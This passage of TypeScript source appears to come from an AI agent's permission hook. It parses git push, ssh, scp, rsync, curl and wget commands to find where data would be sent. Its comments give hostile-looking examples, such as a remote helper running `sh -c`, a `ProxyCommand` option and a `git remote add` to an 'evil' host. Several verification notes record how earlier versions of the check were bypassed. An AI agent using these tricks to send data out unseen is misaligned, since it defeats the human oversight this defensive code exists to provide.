        if (!"nvqufd46".includes(c)) { mark(s, `git push -${c} is not read`); return; }
      }
      continue;
    }
    // git permutes options after the repository and refspecs (`git push origin main --receive-pack=./x`): keep reading.
    positional ??= t;
  }
  const repo = positional ?? repoOpt;
  // A remote helper (`ext::sh -c …`) runs a program instead of naming a place.
  if (repo !== null && /^[A-Za-z][A-Za-z0-9+.-]*::/.test(repo)) { mark(s, "git push to a remote helper"); return; }
  if (repo === null && s.headMoved) { mark(s, "the branch may change before a push to its default remote"); return; }
  // DEC-11f — any other command earlier in the same command (`npm test`, `printf … >> .git/config`, `ln -s …`) may change
  // which repository, folder or remote applies when the push runs: only `cd` steps and chain-safe git may come first.
  if (s.unsafeSeen) s.unknown ??= "another command runs before the push";
  const where = s.cdPath !== null && !s.moved ? s.cdPath : null;
  add(s, { kind: "git", remote: repo, dir: where, ...(cSteps.length ? { cDirs: cSteps } : {}), ...(gitDir !== undefined ? { gitDir } : {}), ...(workTree !== undefined ? { workTree } : {}), ...(s.cdPath !== null && s.bareCd ? { bareCd: true as const } : {}) });
}

// ── ssh family ──────────────────────────────────────────────────────────────

/** `-o` keys that neither run a program nor change the host, port or user. */
const SSH_PLAIN_OPTIONS = /^(stricthostkeychecking|userknownhostsfile|connecttimeout|serveraliveinterval|serveralivecountmax|batchmode|loglevel|identitiesonly|identityfile|compression|requesttty|tcpkeepalive|addkeystoagent|forwardagent|hashknownhosts|numberofpasswordprompts|preferredauthentications|passwordauthentication|pubkeyauthentication|controlmaster|controlpersist|controlpath|ciphers|macs|kexalgorithms|hostkeyalgorithms|setenv|sendenv)$/i;

interface SshShape { withValue: string; plain: string; }
const SSH: SshShape = { withValue: "BbcDEeFIiJLlmOoPpQRSWw", plain: "46AaCfGgKkMNnqsTtVvXxYy" };
const SCP: SshShape = { withValue: "cDFiJloPSX", plain: "346ABCOpqRrTv" };
const SFTP: SshShape = { withValue: "BbcDFiJloPRSsX", plain: "46AaCfNpqrv" };

/**
 * Read ssh-style options. Returns the positional words and the port (`-p`/`-P`), or null when an option
 * runs a program, changes the host, or is not known (the caller marks unknown).
 */
function sshOptions(args: ShellWord[], shape: SshShape, portFlag: string, s: State): { positional: ShellWord[]; port: string | null } | null {
  const positional: ShellWord[] = [];
  let port: string | null = null;
  for (let j = 0; j < args.length; j++) {
    const w = args[j], t = w.text;
    if (positional.length) { positional.push(w); continue; }
    if (t === "--") { positional.push(...args.slice(j + 1)); break; }
    if (!t.startsWith("-") || t === "-") { positional.push(w); continue; }
    for (let k = 1; k < t.length; k++) {
      const c = t[k];
      if (shape.plain.includes(c)) continue;
      if (!shape.withValue.includes(c)) { mark(s, `option -${c} is not read`); return null; }
      const value = k < t.length - 1 ? t.slice(k + 1) : args[++j]?.text;
      if (value === undefined || (k === t.length - 1 && args[j]?.dynamic)) { mark(s, `option -${c} has no readable value`); return null; }
      if (c === "o") {
        const key = value.split(/[=\s]/)[0];
        if (!SSH_PLAIN_OPTIONS.test(key)) { mark(s, `-o ${key} can run a program or change the host`); return null; }
      } else if (shape === SSH && "LRDWw".includes(c)) {
        // A forward or tunnel carries later local traffic (`curl localhost:8080`) to the far side: asked every time.
        mark(s, `ssh -${c} opens a tunnel`); return null;
      } else if (c === portFlag) {
        if (!/^\d{1,5}$/.test(value)) { mark(s, "port is not a number"); return null; }
        port = value;
      } else if ("FJSD".includes(c) && !(shape === SFTP && c === "D" && false)) {
        // -F config (may hold ProxyCommand), -J jump host, -S program / control socket, -D (sftp: local server program).
        if (!(shape === SSH && (c === "S" || c === "D"))) { mark(s, `option -${c} can run a program or change the host`); return null; }
      }
      break;
    }
  }
  return { positional, port };
}

const HOST = /^([a-z0-9._-]+|\[[0-9a-f:.]+\])$/i;

/** `[user@]host` → host lowercased, or null when it is not a plain host. */
function plainHost(text: string): string | null {
  const host = text.slice(text.lastIndexOf("@") + 1);
  if (!host || (text.match(/@/g)?.length ?? 0) > 1) return null;
  return HOST.test(host) ? host.toLowerCase() : null;
}

const sshDest = (scheme: string, host: string, port: string | null) => `${scheme}://${host}${port && port !== "22" ? `:${port}` : ""}`;

function readSsh(args: ShellWord[], s: State): void {
  const o = sshOptions(args, SSH, "p", s);
  if (!o) return;
  const target = o.positional[0];
  if (!target) return; // `ssh -V`, `ssh` alone: no connection.
  if (target.dynamic || target.glob) { mark(s, "ssh host known only at run time"); return; }
  let text = target.text, port = o.port;
  const url = /^ssh:\/\/([^/?#]+)/i.exec(text);
  if (url) { const m = /^(.*?)(?::(\d{1,5}))?$/.exec(url[1])!; text = m[1]; port = m[2] ?? port; }
  const host = plainHost(text);
  if (!host) { mark(s, "ssh host is not plain"); return; }
  add(s, { kind: "dest", destination: sshDest("ssh", host, port) });
}

/** `host:path`, `user@host:path`, `[v6]:path`, `scp://host/…` → host, or null for a local path. */
function remoteOperand(text: string, scheme: "scp" | "sftp" | "rsync"): { host: string | null; port: string | null } | null {
  const url = new RegExp(`^${scheme}://([^/?#]*)`, "i").exec(text);
  if (url) { const m = /^(.*?)(?::(\d{1,5}))?$/.exec(url[1])!; return { host: plainHost(m[1]), port: m[2] ?? null }; }
  if (text.startsWith("/") || text.startsWith("./") || text.startsWith("../") || text.startsWith("~")) return null;
  const colon = text.indexOf(":");
  if (colon <= 0) return null;
  const before = text.slice(0, colon);
  if (before.includes("/")) return null;
  return { host: plainHost(before), port: null };
}

function readScp(args: ShellWord[], s: State): void {
  const o = sshOptions(args, SCP, "P", s);
  if (!o) return;
  for (const w of o.positional) {
    if (w.dynamic || w.glob && w.text.includes(":")) { mark(s, "scp operand known only at run time"); return; }
    const r = remoteOperand(w.text, "scp");
    if (!r) continue;
    if (!r.host) { mark(s, "scp host is not plain"); return; }
    add(s, { kind: "dest", destination: sshDest("ssh", r.host, r.port ?? o.port) });
  }
}

function readSftp(args: ShellWord[], s: State): void {
  const o = sshOptions(args, SFTP, "P", s);
  if (!o) return;
  const target = o.positional[0];
  if (!target) { mark(s, "sftp without a host"); return; }
  if (target.dynamic || target.glob) { mark(s, "sftp host known only at run time"); return; }
  const r = remoteOperand(target.text, "sftp") ?? { host: plainHost(target.text), port: null };
  if (!r.host) { mark(s, "sftp host is not plain"); return; }
  add(s, { kind: "dest", destination: sshDest("ssh", r.host, r.port ?? o.port) });
}

function readRsync(args: ShellWord[], s: State): void {
  for (let j = 0; j < args.length; j++) {
    const w = args[j], t = w.text;
    if (w.dynamic) { mark(s, "rsync argument known only at run time"); return; }
    // A remote shell other than plain `ssh` runs another program (`-e 'ssh -o ProxyCommand=…'`).
    if (/^--rsh(=|$)/.test(t) || /^--rs?h?$/.test(t) && t.length > 2) {
      const v = t.includes("=") ? t.slice(t.indexOf("=") + 1) : args[++j]?.text;
      if (v !== "ssh") { mark(s, "rsync --rsh runs another program"); return; }
      continue;
    }
    if (/^-[A-Za-z0-9@]*e/.test(t) && !t.startsWith("--")) {
      const at = t.indexOf("e");
      const v = at < t.length - 1 ? t.slice(at + 1) : args[++j]?.text;
      if (v !== "ssh") { mark(s, "rsync -e runs another program"); return; }
      continue;
    }
    if (/^--(rsync-path|files-from|include-from|exclude-from|filter|password-file)(=|$)/.test(t) && !t.includes("=")) { j++; continue; }
    // Every word, options included (`--files-from=host:list`), that names a remote counts.
    const value = t.startsWith("-") && t.includes("=") ? t.slice(t.indexOf("=") + 1) : t.startsWith("-") ? "" : t;
    if (!value) continue;
    const daemon = /^rsync:\/\/([^/?#]*)/i.exec(value);
    if (daemon) {
      const m = /^(.*?)(?::(\d{1,5}))?$/.exec(daemon[1])!;
      const host = plainHost(m[1]);
      if (!host) { mark(s, "rsync host is not plain"); return; }
      add(s, { kind: "dest", destination: `rsync://${host}${m[2] ? `:${m[2]}` : ""}` });
      continue;
    }
    const r = remoteOperand(value, "rsync");
    if (!r) continue;
    if (!r.host) { mark(s, "rsync host is not plain"); return; }
    add(s, { kind: "dest", destination: value.includes("::") ? `rsync://${r.host}` : sshDest("ssh", r.host, null) });
  }
}

// ── curl / wget ─────────────────────────────────────────────────────────────

/** True for this computer: `localhost`, `127.x.x.x`, `[::1]` (after WHATWG host normalisation). */
export function isLoopbackHost(hostname: string): boolean {
  const h = hostname.toLowerCase();
  return h === "localhost" || h === "[::1]" || /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(h);
}

/**
 * An address as curl/wget read it → `{destination, loopback}`, or null when it cannot be read plainly.
 * A missing scheme is http (both tools assume it); credentials, path and query are dropped.
 */
export function urlDestination(text: string): { destination: string; loopback: boolean } | null {
  if (/[\s\\\u0000-\u001f\u007f{}]/.test(text)) return null;
  const withScheme = /^[a-z][a-z0-9+.-]*:\/\//i.test(text) ? text : `http://${text}`;
  const m = /^([a-z][a-z0-9+.-]*):\/\/([^/?#]*)/i.exec(withScheme);
  if (!m) return null;
  const scheme = m[1].toLowerCase();
  if (!/^(https?|ftps?|sftp|scp|smtps?|imaps?|pop3s?|ws|wss|telnet|dict|gopher|ldaps?|mqtt|tftp|rtsp)$/.test(scheme)) return null;
  const authority = m[2];
  if ((authority.match(/@/g)?.length ?? 0) > 1 || authority.includes("[") && !/\[[0-9a-f:.]+\]/i.test(authority)) return null;
  let parsed: URL;
  try { parsed = new URL(`${scheme === "http" || scheme === "https" ? scheme : "http"}://${authority}/`); } catch { return null; }
  const host = parsed.hostname;
  if (!host || !HOST.test(host)) return null;
  const port = parsed.port || (/:(\d{1,5})$/.exec(authority.replace(/^.*@/, ""))?.[1] ?? "");
  return { destination: `${scheme}://${host.toLowerCase()}${port ? `:${port}` : ""}`, loopback: isLoopbackHost(host) };
}

const CURL_SHORT_VALUE = "AbcCdDeEFHKmoPQrtTuUwxXyYz";
const CURL_UPLOAD_LONG = ["data", "data-ascii", "data-binary", "data-raw", "data-urlencode", "json", "form", "form-string", "upload-file", "mail-from", "mail-rcpt", "mail-auth"];
/** Long options that take a value (the value is not an address). Unlisted ones count their next word as an address. */
const CURL_LONG_VALUE = new Set([
  "output", "header", "user-agent", "user", "cookie", "cookie-jar", "max-time", "connect-timeout", "retry", "retry-delay",
  "retry-max-time", "write-out", "referer", "cert", "key", "cacert", "capath", "range", "dump-header", "oauth2-bearer",
  "limit-rate", "max-redirs", "continue-at", "keepalive-time", "expect100-timeout", "local-port", "interface", "variable",
  "url-query", "aws-sigv4", "netrc-file", "trace", "trace-ascii", "stderr", "output-dir", "create-file-mode", "ciphers",
  "tls-max", "proto", "proto-redir", "cert-type", "key-type", "pass", "hostpubmd5", "hostpubsha256", "time-cond",
  "speed-limit", "speed-time", "quote", "telnet-option", "ftp-port", "proxy-user", "data", "data-ascii", "data-binary",
  "data-raw", "data-urlencode", "json", "form", "form-string", "upload-file", "request", "mail-from", "mail-rcpt", "mail-auth",
  "etag-compare", "etag-save", "netrc-file", "proxy-header", "cookie", "unix-socket", "abstract-unix-socket", "connect-to",
  "resolve", "proxy", "preproxy", "doh-url", "dns-servers", "socks4", "socks4a", "socks5", "socks5-hostname", "config",
]);
/** Options that put a file's contents or saved credentials into the request. */
const CURL_FILE_SENDERS = ["etag-compare", "netrc", "netrc-file", "netrc-optional", "proxy-header"];
/** Options that change where the request really goes, or read more options from somewhere: unknown. */
const CURL_REROUTE = ["config", "next", "proxy", "preproxy", "socks4", "socks4a", "socks5", "socks5-hostname", "connect-to", "resolve", "unix-socket", "abstract-unix-socket", "doh-url", "dns-servers"];
/** curl reads an unambiguous prefix of a long option on older versions: a prefix of any of these counts as it. */
const prefixOf = (name: string, list: readonly string[]) => name.length >= 1 && list.some((o) => o.startsWith(name));

function readCurl(args: ShellWord[], s: State): void {
  let upload = false, reroute = false, dynamic = false, configRead = false;
  const urls: ShellWord[] = [];
  const method = (v: string | undefined) => { if (!v || !/^(GET|HEAD|OPTIONS)$/i.test(v)) upload = true; };
  for (let j = 0; j < args.length; j++) {
    const w = args[j], t = w.text;
    if (w.dynamic || w.glob) dynamic = true;
    if (t === "--") { urls.push(...args.slice(j + 1)); break; }
    // Any word starting with `@` is a file curl reads into the request (`--proxy-header @f`, `-H @f`): an upload.
    if (t.startsWith("@") || /^--?[^=]*=@/.test(t)) upload = true;
    if (t.startsWith("--") && t.length > 2) {
      const eq = t.indexOf("=");
      const name = (eq > 0 ? t.slice(2, eq) : t.slice(2)).replace(/^no-/, "");
      // Options that send a file's contents or saved credentials (`--etag-compare f`, `--netrc`).
      if (name.length >= 3 && CURL_FILE_SENDERS.some((o) => o.startsWith(name))) upload = true;
      const takesValue = eq < 0 && (CURL_LONG_VALUE.has(name) || prefixOf(name, CURL_UPLOAD_LONG) || prefixOf(name, ["request", "url"]) || CURL_REROUTE.includes(name));
      const value = eq > 0 ? t.slice(eq + 1) : takesValue ? args[j + 1]?.text : undefined;
      if (takesValue) j++;
      // A value read from a file (`-H @file`, `--url-query k@file`, `--variable n@file`, a cookie file) sends that file.
      if (value !== undefined && (value.startsWith("@") || /^(url-query|variable|expand-)/.test(name) && value.includes("@") || name === "cookie" && !value.includes("="))) upload = true;
      if (prefixOf(name, CURL_REROUTE) && name.length >= 2 || name === "x") reroute = true;
      if (name.length >= 2 && ("config".startsWith(name) || "next".startsWith(name))) configRead = true;
      if (prefixOf(name, CURL_UPLOAD_LONG) || name === "get") upload = true;
      if (name.length >= 2 && "request".startsWith(name)) method(value);
      if (name === "url" && value !== undefined) urls.push({ ...w, text: value });
      continue;
    }
    if (t.startsWith("-") && t.length > 1) {
      for (let k = 1; k < t.length; k++) {
        const c = t[k];
        if (c === ":") { reroute = true; configRead = true; } // -: is --next
        if (c === "G" || c === "n") upload = true;
        if (!CURL_SHORT_VALUE.includes(c)) continue;
        const value = k < t.length - 1 ? t.slice(k + 1) : args[++j]?.text;
        if (k === t.length - 1 && args[j]?.dynamic) dynamic = true;
        if (value !== undefined && (value.startsWith("@") || c === "b" && !value.includes("="))) upload = true;
        if (c === "d" || c === "F" || c === "T") upload = true;
        if (c === "X") method(value);
        if (c === "K" || c === "x") reroute = true;
        if (c === "K") configRead = true;
        break;
      }
      continue;
    }
    urls.push(w);
  }
  // Options read from a config file or standard input (`-K -`) can upload anything to anywhere.
  if (reroute && configRead) { mark(s, "curl reads options from a file"); return; }
  // A GET whose address is known only at run time can carry data in the address.
  if (!upload) { if (dynamic && urls.some((u) => u.dynamic || u.glob)) mark(s, "curl address known only at run time"); return; }
  if (reroute) { mark(s, "curl reads options from elsewhere or goes through another host"); return; }
  if (!urls.length) { mark(s, "curl upload without an address"); return; }
  for (const u of urls) {
    if (u.dynamic || u.glob) { mark(s, "curl address known only at run time"); return; }
    const d = urlDestination(u.text);
    if (!d) { mark(s, "curl address is not plain"); return; }
    if (/^(smtps?):/.test(d.destination) || !d.loopback) add(s, { kind: "dest", destination: d.destination });
  }
}

const WGET_UPLOAD_LONG = ["post-data", "post-file", "body-data", "body-file", "method"];
const WGET_REROUTE = ["execute", "config", "input-file", "proxy", "bind-address", "base"];
const WGET_SHORT_VALUE = "OoaeiBtTwQPUlDRAIXn";

function readWget(args: ShellWord[], s: State): void {
  let upload = false, reroute = false, dynamic = false;
  const urls: ShellWord[] = [];
  for (let j = 0; j < args.length; j++) {
    const w = args[j], t = w.text;
    if (w.dynamic || w.glob) dynamic = true;
    if (t === "--") { urls.push(...args.slice(j + 1)); break; }
    if (t.startsWith("--") && t.length > 2) {
      // getopt_long: `--name=value`, `--name value`, and any unambiguous prefix of the name.
      const eq = t.indexOf("=");
      const name = (eq > 0 ? t.slice(2, eq) : t.slice(2)).replace(/^no-/, "");
      const up = prefixOf(name, WGET_UPLOAD_LONG), re = prefixOf(name, WGET_REROUTE);
      if (re) reroute = true;
      if (up) {
        if (name.length >= 2 && "method".startsWith(name)) { const v = eq > 0 ? t.slice(eq + 1) : args[++j]?.text; if (!v || !/^(GET|HEAD|OPTIONS)$/i.test(v)) upload = true; }
        else { upload = true; if (eq < 0) j++; }
      } else if (re && eq < 0) j++;
      continue;
    }
    if (t.startsWith("-") && t.length > 1) {
      for (let k = 1; k < t.length; k++) {
        const c = t[k];
        if (!WGET_SHORT_VALUE.includes(c)) continue;
        if (c === "e" || c === "i") reroute = true;
        if (k === t.length - 1) j++;
        break;
      }
      continue;
    }
    urls.push(w);
  }
  if (reroute && (upload || dynamic)) { mark(s, "wget reads commands or addresses from elsewhere"); return; }
  if (reroute) { mark(s, "wget reads commands or addresses from elsewhere"); return; }
  if (!upload) { if (urls.some((u) => u.dynamic || u.glob)) mark(s, "wget address known only at run time"); return; }
  if (!urls.length) { mark(s, "wget upload without an address"); return; }
  for (const u of urls) {
    if (u.dynamic || u.glob) { mark(s, "wget address known only at run time"); return; }
    const d = urlDestination(u.text);
    if (!d) { mark(s, "wget address is not plain"); return; }
    if (!d.loopback) add(s, { kind: "dest", destination: d.destination });
  }
}

// ── git destinations (host side) ────────────────────────────────────────────

/**
 * A git repository address as a destination key: `https://host/owner/repo`, `ssh://host/owner/repo`,
 * `file:///abs/path`. Credentials and a trailing `.git` or `/` are dropped. Null for a remote helper
 * (`ext::…`), control characters or a host that is not plain.
 */
export function gitDestination(url: string, cwd: string): string | null {
  const u = url.trim();
  if (!u || /[\u0000-\u001f\u007f]/.test(u) || /^[a-z][a-z0-9+.-]*::/i.test(u)) return null;
  const tidy = (p: string) => p.replace(/[?#].*$/, "").replace(/\/+$/, "").replace(/\.git$/i, "").replace(/\/+$/, "");
  const full = /^([a-z][a-z0-9+.-]*):\/\/([^/]*)(\/.*)?$/i.exec(u);
  if (full) {
    const scheme = full[1].toLowerCase();
    if (scheme === "file") return `file://${tidy(path.resolve(decodeURIComponent((full[2] ? `/${full[2]}` : "") + (full[3] ?? ""))))}`;
    const authority = full[2];
    if ((authority.match(/@/g)?.length ?? 0) > 1) return null;
    const hostPort = authority.slice(authority.lastIndexOf("@") + 1);
    const m = /^(.*?)(?::(\d{1,5}))?$/.exec(hostPort)!;
    if (!HOST.test(m[1])) return null;
    return `${scheme}://${m[1].toLowerCase()}${m[2] ? `:${m[2]}` : ""}${tidy(full[3] ?? "")}`;
  }
  const colon = u.indexOf(":");
  if (colon > 0 && !u.slice(0, colon).includes("/")) {
    const host = plainHost(u.slice(0, colon));
    if (!host) return null;
    return `ssh://${host}/${tidy(u.slice(colon + 1)).replace(/^\/+/, "")}`;
  }
  return `file://${tidy(path.resolve(cwd, u))}`;
}

/**
 * A push address that names a folder on this computer (a path or `file://`). Same split as gitDestination: a scheme or
 * a colon before the first slash is a network address.
 */
function isLocalGitAddress(url: string): boolean {
  const u = url.trim();
  const full = /^([a-z][a-z0-9+.-]*):\/\//i.exec(u);
  if (full) return full[1].toLowerCase() === "file";
  const colon = u.indexOf(":");
  return !(colon > 0 && !u.slice(0, colon).includes("/"));
}

/** Runs `git <args>` in `cwd`; the trimmed stdout, or null on any failure. */
export type GitRunner = (args: string[], cwd: string) => string | null;

/**
 * Repository settings that send a push somewhere else than its address says, or run a program on the way
 * (an earlier silent `git config core.sshCommand …` then `git push` to a remembered remote, verify 2026-11-05).
 * Canonical key names are lowercase apart from the subsection, so the pattern is lowercase.
 */
export const GIT_TRANSPORT_KEYS = "^(core\\.(sshcommand|gitproxy|askpass)|http\\..*(proxy|curloptresolve)|https?\\.(proxy|curloptresolve)|gpg\\..*program|remote\\..*\\.(receivepack|proxy|vcs|uploadpack)|protocol\\..*\\.allow)$";

/**
 * Settings that make a push also push submodules to their own remotes (`submodule.recurse true`, `push.recurseSubmodules
 * on-demand|only`): an earlier silent `git config submodule.recurse true` then `git push origin` sent a submodule's
 * commits to the submodule's remote (verify 2026-11-05). Read from every scope git reads (global, system, includes).
 */
export const GIT_RECURSE_KEYS = "^(push\\.recursesubmodules|submodule\\.recurse)$";
/** A key every repository's config has (`git init` writes it): a config query that matches nothing still prints it. */
export const GIT_CONFIG_PRESENT = "^core\\.repositoryformatversion$";
/** The settings that pick a bare push's remote. */
export const GIT_DEFAULT_REMOTE_KEYS = "^(branch\\..*\\.(pushremote|remote)|remote\\.pushdefault)$";
/** Include settings: a file they name is read as config when git runs. */
export const GIT_INCLUDE_KEYS = "^include(if\\..*)?\\.path$";

/** One entry of a `git config -z [--show-origin] --get-regexp` listing; `value` is null for a key without `=`. */
export interface GitConfigEntry { origin?: string; key: string; value: string | null }

/** Parses a `-z` listing (NUL-terminated `key\nvalue` records, each after its origin with --show-origin). */
export function parseGitConfigZ(out: string, showOrigin: boolean): GitConfigEntry[] {
  const parts = out.split("\0");
  if (parts.length && parts[parts.length - 1] === "") parts.pop();
  const entries: GitConfigEntry[] = [];
  for (let i = 0; i < parts.length; i++) {
    const origin = showOrigin ? parts[i++] : undefined;
    const kv = parts[i] ?? "";
    const nl = kv.indexOf("\n");
    entries.push({ ...(origin !== undefined ? { origin } : {}), key: nl < 0 ? kv : kv.slice(0, nl), value: nl < 0 ? null : kv.slice(nl + 1) });
  }
  return entries;
}

/** A value of GIT_RECURSE_KEYS that pushes nothing beyond the repository itself (a key without a value is true). */
const GIT_RECURSE_OFF = /^(false|no|off|0|check)$/i;

/** True when a `config --get-regexp GIT_RECURSE_KEYS` listing may push submodules too. */
export function gitRecursesSubmodules(listing: string | null): boolean {
  if (!listing) return false;
  return listing.split(/\r?\n/).filter(Boolean).some((line) => {
    const sp = line.indexOf(" ");
    return sp < 0 || !GIT_RECURSE_OFF.test(line.slice(sp + 1).trim());
  });
}

/** DEC-11f — one (repository, destination) pair: `repo` is the real git folder a push runs from, null for ssh/uploads. */
export interface OutwardPair { repo: string | null; destination: string }

export interface ResolveOptions {
  /**
   * The folder the agent's shell is in when the command starts (the SDK PreToolUse hook's `cwd`; the Bash tool keeps
   * its folder between commands). Unknown (null) means only the work folder is known.
   */
  shellCwd?: string | null;
  /** Another repository may sit inside the work folder (outwardMemory `hasNestedGitRepo`): matters only without `shellCwd`. */
  nestedRepo?: boolean;
  /** `CDPATH` is set: a `cd` to a bare folder name may go elsewhere. */
  cdpath?: boolean;
  /** Real path of a folder, or null (default: fs.realpathSync.native). */
  realpath?: (p: string) => string | null;
}

const defaultRealpath = (p: string): string | null => { try { return fs.realpathSync.native(p); } catch { return null; } };

/**
 * The destinations a reading sends to, and the (repository, destination) pairs the host remembers (DEC-11f). For each
 * push it resolves the folder the push really runs in (the shell's folder, then the static `cd` steps and `-C`), the
 * repository there (`--git-dir`/`--work-tree` as written) and that repository's push URLs. `unknown` is set when any of
 * them cannot be named; the host then asks every time and remembers nothing.
 */
export function resolveOutwardDestinations(reading: OutwardReading, cwd: string | null, git: GitRunner, opts: ResolveOptions = {}): { destinations: string[]; pairs: OutwardPair[]; unknown: string | null } {
  const out = new Map<string, OutwardPair>();
  const put = (p: OutwardPair) => out.set(JSON.stringify([p.repo, p.destination]), p);
  const realpath = opts.realpath ?? defaultRealpath;
  let unknown = reading.unknown;
  const shellCwd = opts.shellCwd && path.isAbsolute(opts.shellCwd) ? opts.shellCwd : null;
  const start = shellCwd ?? cwd;
  for (const t of reading.targets) {
    if (t.kind === "dest") { put({ repo: null, destination: t.destination }); continue; }
    if (!start) { unknown ??= "no work folder to read git remotes in"; continue; }
    const cDirs = t.cDirs ?? [];
    const anchored = t.dir !== null ? path.isAbsolute(t.dir) : cDirs.length > 0 && path.isAbsolute(cDirs[0]);
    if (!shellCwd && !anchored) {
      // Without the shell's folder only the work folder is known. The shell may be in any folder below it: that is the
      // same repository only when no other repository sits inside, a relative path that climbs (`cd ../x`) may land
      // anywhere, and a relative `--git-dir`/`GIT_DIR` names a repository relative to that unknown folder (bare
      // repositories are not seen by the folder walk).
      if (opts.nestedRepo) { unknown ??= "another repository inside the work folder"; continue; }
      if ([t.dir, ...cDirs].some((p) => p !== null && p.split("/").includes(".."))) { unknown ??= "a relative folder outside the shell's folder"; continue; }
      if ([t.gitDir, t.workTree].some((p) => p !== undefined && !path.isAbsolute(p))) { unknown ??= "a relative repository folder without the shell's folder"; continue; }
    }
    if (t.bareCd && opts.cdpath) { unknown ??= "CDPATH may send a cd elsewhere"; continue; }
    // The shell's `cd` is logical (`cd lnk/..` is the folder holding `lnk`); git's `-C` is a chdir, so each step is
    // resolved on disk (`-C lnk/..` is the parent of the link's target).
    let at: string | null = t.dir ? path.resolve(start, t.dir) : start;
    for (const c of cDirs) at = at === null ? null : realpath(path.isAbsolute(c) ? c : `${at}/${c}`);
    if (at === null) { unknown ??= "a git -C folder that does not exist"; continue; }
    const dir: string = at;
    const globals = [...(t.gitDir !== undefined ? [`--git-dir=${t.gitDir}`] : []), ...(t.workTree !== undefined ? [`--work-tree=${t.workTree}`] : [])];
    const g = (args: string[]) => git([...globals, ...args], dir);
    const gitFolder = g(["rev-parse", "--absolute-git-dir"]);
    const repo = gitFolder ? realpath(gitFolder) : null;
    if (!repo) { unknown ??= "the push does not run inside a repository this app can read"; continue; }
    // Settings are read from every scope git reads (repository, global, system, includes). `--get-regexp` prints nothing
    // both when no key matches and when git fails (a timeout on a huge include), so every query also matches a key
    // each repository has: no answer at all means "could not read" and asks (verify r3: a failed query failed open).
    const cfg = (pattern: string, nameOnly = false): string | null => {
      const outp = g(["config", ...(nameOnly ? ["--name-only"] : []), "--get-regexp", `${GIT_CONFIG_PRESENT}|${pattern}`]);
      if (outp === null) return null;
      return outp.split(/\r?\n/).filter((l) => l && !/^core\.repositoryformatversion( |$)/.test(l)).join("\n");
    };
    // `-z` keeps values exactly (the runner trims only the ends of the output, which are a key and a NUL here).
    const cfgZ = (pattern: string, showOrigin = false): GitConfigEntry[] | null => {
      const outp = g(["config", "-z", ...(showOrigin ? ["--show-origin"] : []), "--get-regexp", `${GIT_CONFIG_PRESENT}|${pattern}`]);
      if (outp === null) return null;
      return parseGitConfigZ(outp, showOrigin).filter((e) => e.key !== "core.repositoryformatversion");
    };
    const transport = cfg(GIT_TRANSPORT_KEYS), recurse = cfg(GIT_RECURSE_KEYS), rewrites = cfg("^url\\..*insteadof$");
    const defaults = cfgZ(GIT_DEFAULT_REMOTE_KEYS), includes = cfgZ(GIT_INCLUDE_KEYS, true);
    if (defaults === null || includes === null) { unknown ??= "repository settings could not be read"; continue; }
    // Verify r6 C2: a file inside the repository's git folder read as config (`include.path=COMMIT_EDITMSG`) is rewritten
    // by a chain-safe `git commit -m '[remote "origin"] pushurl = …'` before the push runs. Includes elsewhere (a shared
    // `../.gitconfig`, a global includeIf) are read as they are now.
    const common0 = g(["rev-parse", "--path-format=absolute", "--git-common-dir"]);
    const commonReal = common0 ? realpath(common0) : null;
    if (!commonReal) { unknown ??= "the repository's shared git folder cannot be read"; continue; }
    const inside = (p: string) => [repo, commonReal].some((b) => p === b || p.startsWith(`${b}/`));
    const includeInGitDir = includes.some((e) => {
      if (e.value === null || e.value === "" || /[\u0000-\u001f]/.test(e.value)) return true;
      let target = e.value;
      if (target.startsWith("~/")) target = path.join(os.homedir(), target.slice(2));
      else if (!path.isAbsolute(target)) {
        if (!e.origin?.startsWith("file:")) return true;
        target = path.join(path.dirname(path.resolve(dir, e.origin.slice(5))), target);
      }
      const parent = realpath(path.dirname(target));
      return parent === null || inside(path.join(parent, path.basename(target))) || inside(path.resolve(target));
    });
    if (includeInGitDir) { unknown ??= "a config include reads a file inside the git folder"; continue; }
    const remoteKeys = cfg("^remote\\..*\\.(url|pushurl)$", true);
    if (transport === null || recurse === null || rewrites === null || remoteKeys === null) { unknown ??= "repository settings could not be read"; continue; }
    if (transport) { unknown ??= "repository settings change how a push travels"; continue; }
    if (gitRecursesSubmodules(recurse)) { unknown ??= "a push also pushes submodules to their own remotes"; continue; }
    let remote = t.remote;
    if (remote === null) {
      // The full ref, not `--short`: a tag or remote named like the branch makes `--short` print `heads/main`, and the
      // branch's own pushRemote would then be missed for `origin` (verify r4 B1).
      const head = g(["symbolic-ref", "--quiet", "HEAD"]);
      const branch = head && head.startsWith("refs/heads/") ? head.slice("refs/heads/".length) : null;
      if (head === null || branch === null) { unknown ??= "the branch a bare push uses cannot be read"; continue; }
      // Read from the `-z` listing (last value wins, as `--get`): a trimmed `origin ` would be the allowed `origin` here
      // and another remote to git (verify r6 C1). A value with spaces, control characters or nothing asks.
      const last = (key: string) => { const hits = defaults.filter((e) => e.key === key); return hits.length ? hits[hits.length - 1].value : undefined; };
      const picked = [last(`branch.${branch}.pushremote`), last("remote.pushdefault"), last(`branch.${branch}.remote`)];
      if (picked.some((v) => v === null || v === "" || (v !== undefined && /[\s\u0000-\u001f\u007f]/.test(v)))) { unknown ??= "the default push remote is not a plain name"; continue; }
      remote = picked.find((v): v is string => typeof v === "string") ?? "origin";
    }
    // `remote get-url --push` applies pushurl and the insteadOf / pushInsteadOf rewrites of a named remote. git looks a
    // configured remote up by any name (`foo/bar`, `A.b`) before it reads the word as an address, so every word is asked
    // about first (verify 2026-11-05: `git remote add foo/bar https://evil/x.git` after `foo/bar` was allowed as a folder).
    // Legacy `remotes/<name>` and `branches/<name>` files: git reads them at push time, and one that reads empty for
    // `get-url` (a fifo, a timeout) makes it answer the bare name, read here as a folder (verify r4 B2). Any such file asks.
    if ([repo, commonReal].some((base) => ["remotes", "branches"].some((d) => { try { fs.lstatSync(path.join(base, d, remote)); return true; } catch { return false; } }))) { unknown ??= "a legacy remote file names the remote"; continue; }
    const named = g(["remote", "get-url", "--push", "--all", "--", remote]);
    // A push to a folder on this computer asks every time and is never remembered (verify r4/r5): the repository git
    // enters for a written path depends on `<p>/.git` and `gitdir:` files, `.git` suffixes it tries, links, `~`, the
    // top of the worktree for a relative path and which candidates are valid repositories, all of which a command
    // can change. A remembered key for it could be reused for another repository.
    const LOCAL = "a push to a folder on this computer";
    const destOf = (addr: string): string | null => { try { return isLocalGitAddress(addr) ? null : gitDestination(addr, dir); } catch { return null; } };
    if (named) {
      for (const line of named.split(/\r?\n/).filter(Boolean)) {
        const d = destOf(line);
